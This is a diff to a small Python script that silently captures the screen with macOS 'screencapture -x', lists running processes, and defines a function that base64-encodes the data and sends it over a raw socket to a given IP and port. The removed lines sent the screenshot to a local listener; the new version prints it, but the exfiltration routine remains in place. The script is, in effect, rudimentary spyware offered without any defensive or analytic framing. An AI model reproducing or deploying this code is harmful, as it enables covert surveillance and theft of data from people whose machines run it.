@@ -1,19 +1,26 @@
 from io import BytesIO
 from PIL import Image,ImageGrab
 from base64 import b64encode
-import io,subprocess,socket
+import os,subprocess,socket
+
+
 
 def screenshot():
-    pil = ImageGrab.grab()
-    img_bytes = io.BytesIO()
-    pil.save(img_bytes, format='PNG')
-    img = img_bytes.getvalue()
+    os.system('/usr/sbin/screencapture -x $PWD/ss.png')
+    pil = Image.open('ss.png')
+    output = BytesIO()
+    pil.save(output, format='PNG')
+    img = output.getvalue()
     return img
 
+
+
 def processes():
-    cmd = 'ps o pid,uid,command'
+    cmd = '/bin/ps o pid,uid,command'
     processes = subprocess.check_output(cmd, shell=True)
     return processes
+
+
 
 def send_to_server(ip, port, data):
     b64 = b64encode(data)
@@ -22,6 +29,7 @@ def send_to_server(ip, port, data):
     s.send(b64)
     s.close()
 
+
+
 if __name__ == '__main__':
-    send_to_server('127.0.0.1', 8080, screenshot())
-    #send_to_server('127.0.0.1', 8080, processes())
+    print(screenshot())
